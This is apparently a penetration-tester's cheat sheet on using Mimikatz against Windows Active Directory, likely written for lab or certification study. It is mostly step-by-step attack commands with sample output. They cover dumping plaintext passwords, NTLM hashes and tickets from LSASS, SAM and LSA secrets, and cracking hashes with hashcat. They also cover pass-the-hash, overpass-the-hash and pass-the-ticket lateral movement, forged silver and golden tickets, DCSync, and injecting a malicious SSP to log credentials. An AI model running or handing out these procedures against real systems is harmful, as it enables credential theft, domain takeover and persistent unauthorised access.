---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Mimikatz

{% hint style="info" %}
* _Each action has this format: `module::command`._
* _`privilege::debug` enables the `SeDebugPrivilege`._
* _`token::elevate` leverages the `SeImpersonatePrivilege` to gain `SYSTEM`._
{% endhint %}

## Credential Attacks

### Cached Creds

For more info about this attack, see [here](../../tl-dr/active-directory/ad-authentication.md#ntml) and [here](../../tl-dr/active-directory/ad-authentication.md#cached-credentials).

{% tabs %}
{% tab title="1. SeDebugPrivilege" %}
```powershell
mimikatz # privilege::debug
Privilege '20' OK
```
{% endtab %}

{% tab title="2. Active Users" %}
Dump current logged-on users’ plaintext passwords, hashes, and tickets from memory:

```
mimikatz # sekurlsa::logonpasswords
```
{% endtab %}

{% tab title="3. SAM" %}
Extract local user (NTML) hashes from the SAM database on the system:

{% code overflow="wrap" %}
```powershell
mimikatz # token::elevate
mimikatz # lsadump::sam
```
{% endcode %}

Crack captured hashes:

{% code overflow="wrap" %}
```bash
hashcat -m1000 nelly_ntml /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
{% endcode %}
{% endtab %}

{% tab title="4. Service Accounts" %}
Retrieve cached secrets like Local Security Authority (LSA) secrets, stored credentials, service account passwords, and cached domain credentials from the LSA secrets storage:

```powershell
mimikatz # lsadump::secrets
```
{% endtab %}
{% endtabs %}

<table><thead><tr><th width="226">Module</th><th width="112">Admin Rights</th><th width="115">LSASS Access</th><th width="172">Credential Guard Issue</th><th>Can Run Offline</th></tr></thead><tbody><tr><td><code>sekurlsa::logonpasswords</code></td><td>✅ Yes</td><td>✅ Yes</td><td>✅ Yes</td><td>❌ No</td></tr><tr><td><code>lsadump::sam</code></td><td>✅ Yes</td><td>❌ No</td><td>❌ No</td><td>✅ Yes</td></tr><tr><td><code>lsadump::secrets</code></td><td>✅ Yes</td><td>❌ No</td><td>❌ No</td><td>✅ Yes</td></tr></tbody></table>

## Lateral Movement

### Pass-the-Hash

For more info about this attack, see [here](../../tl-dr/active-directory/lateral-movement/pass-the-hash.md).

{% tabs %}
{% tab title="1. SeDebugPrivilege" %}
```powershell
mimikatz # privilege::debug
Privilege '20' OK
```
{% endtab %}

{% tab title="2. LSASS" %}
Domain hashes are stored in memory of the LSASS process.

```powershell
mimikatz # sekurlsa::logonpasswords
<SNIP>

Authentication Id : 0 ; 5468350 (00000000:005370be)
Session           : RemoteInteractive from 5
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 2:08:28 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
<SNIP>
```
{% endtab %}

{% tab title="3. PtH" %}
With the `Domain Administrator`'s hash, we can perform the PtH attack.

{% code overflow="wrap" %}
```powershell

$ impacket-wmiexec -debug -hashes :160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] SMBv3.0 dialect used
[+] Target system is 192.168.50.248 and isFQDN is False
[+] StringBinding: SERVERWK248[64285]
[+] StringBinding: 192.168.50.248[64285]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.50.248[64285]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Overpass-the-Hash

For more info about this attack, see [here](../../tl-dr/active-directory/lateral-movement/overpass-the-hash.md).

{% tabs %}
{% tab title="1. Obtain NTLM" %}
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
...
NTLM : 369def79d8372408bf6e93364cc93075
...
```
{% endtab %}

{% tab title="2. PtH" %}
Launch a session in the Kerberos ticket context of the target user.

{% code overflow="wrap" %}
```powershell
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
{% endcode %}
{% endtab %}

{% tab title="3. Auth" %}
Use a Kerberos-authenticated service, e.g. CIFS, to convert the NTML to a TGT.

{% code overflow="wrap" %}
```powershell
# List cached tickets
> klist
...
Cached Tickets: (0)

# Kerberos-based authentication service
> net use \\files04
The command completed successfully.

# List cached tickets
> klist
...
Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```
{% endcode %}
{% endtab %}

{% tab title="4. Exploit" %}
Use any Kerberbos-based authentication utility directly, such as `PsExec`.

```powershell
.\PsExec.exe \\files04 cmd
...
C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```
{% endtab %}
{% endtabs %}

### Pass-the-Ticket

For more info about this attack, see [here](../../tl-dr/active-directory/lateral-movement/pass-the-ticket.md).

{% tabs %}
{% tab title="1. Export Tickets" %}
```powershell
privilege::debug
sekurlsa::tickets /export
...
Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
{% endtab %}

{% tab title="2. Inject Ticket" %}
Find the relevant ticket.

{% code overflow="wrap" %}
```powershell
> dir *.kirbi
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
...
```
{% endcode %}

Inject it into the current session.

```powershell
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
{% endtab %}

{% tab title="3. Exploit" %}
```powershell
> klist
...
Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
        
> ls \\web04\backup
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```
{% endtab %}
{% endtabs %}

### Silver Ticket

For more info about this attack, see [here](../../tl-dr/active-directory/attacks/silver-tickets.md).

{% tabs %}
{% tab title="1. Extract NTML" %}
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

User Name : iis_service
NTLM      : 4d28cf5252d39971419580a51484ca09
SID       : S-1-5-21-1987370270-658905905-1781884369-1109
```
{% endtab %}

{% tab title="2. Forge ST" %}
{% code overflow="wrap" %}
```powershell
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```
{% endcode %}
{% endtab %}

{% tab title="3. Exploit" %}
```powershell
# List cached tickets
> klist
Client: jeffadmin @ corp.com
Server: http/web04.corp.com @ corp.com
Ticket Flags: forwardable renewable pre_authent

# Exploit
> iwr -UseDefaultCredentials http://web04
StatusCode        : 200
StatusDescription : OK
...
```
{% endtab %}
{% endtabs %}

### DCSync

For more info about this attack, see [here](../../tl-dr/active-directory/attacks/dcsync.md).

{% tabs %}
{% tab title="1. Extract NTML" %}
```powershell
mimikatz # lsadump::dcsync /user:corp\dave
...
SAM Username         : dave
NTLM Hash            : 08d7a47a6f9f66b97b1bae4178747494
LM Hash              : 45bc7d437911303a42e764eaf8fda43e
...
```
{% endtab %}

{% tab title="2. Crack NTML" %}
{% code overflow="wrap" %}
```bash
$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1
```
{% endcode %}
{% endtab %}

{% tab title="3. DCSync" %}
```powershell
mimikatz # lsadump::dcsync /user:corp\Administrator
...
NTLM Hash: 2892d26cdf84d7a70e2eb3b9f05c425e
```
{% endtab %}
{% endtabs %}

### SSP Injection

For more info about this attack, see [here](../../tl-dr/active-directory/lateral-movement/ssp-injection.md).

{% tabs %}
{% tab title="1. Inject malicious SSP into LSASS" %}
```powershell
mimikatz # misc::memssp
Injected =)
```
{% endtab %}

{% tab title="2. Intercept Creds" %}
```powershell
> type C:\Windows\System32\mimilsa.log
<SNIP>
[00000000:0066608e] CORP\Administrator  QWERTY123!@#
<SNIP>
```
{% endtab %}
{% endtabs %}

## Persistence

### Golden Ticket

For more info about this attack, see [here](../../tl-dr/active-directory/persistence/golden-ticket.md).

{% tabs %}
{% tab title="1. Extract NTML" %}
```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
...
User : krbtgt
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```
{% endtab %}

{% tab title="2. Create the GT" %}
Delete existing Kerberos tickets.

```powershell
mimikatz # kerberos::purge
```

Create the GT.

{% code overflow="wrap" %}
```powershell
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-... /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
...
Golden ticket for 'jen @ corp.com' successfully submitted for current session
```
{% endcode %}
{% endtab %}

{% tab title="3. Exploit" %}
Launch a new session using the current security context.

```powershell
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
```

Exploit.

```powershell
# Use hostname, not IP address as the latter forces NTML auth
> PsExec.exe \\dc1 cmd.exe
```
{% endtab %}
{% endtabs %}

## Mimikatz via WinRM

When using `mimikatz` via a WinRM session it won't run as expected because it’s launched in a non-interactive session. This prevents it from creating or accessing a console. This results in repeated prompts and no actual output. The solution to this issue is to run it with a non-interactive command:

{% code overflow="wrap" %}
```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
{% endcode %}

## Resources

{% tabs %}
{% tab title="mimikatz.exe" %}
{% embed url="https://github.com/gentilkiwi/mimikatz/" %}
{% endtab %}

{% tab title="Invoke-Mimikatz.ps1" %}
{% embed url="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1" %}
{% endtab %}

{% tab title="Guide" %}
{% embed url="https://adsecurity.org/?page_id=1821" %}
{% endtab %}
{% endtabs %}
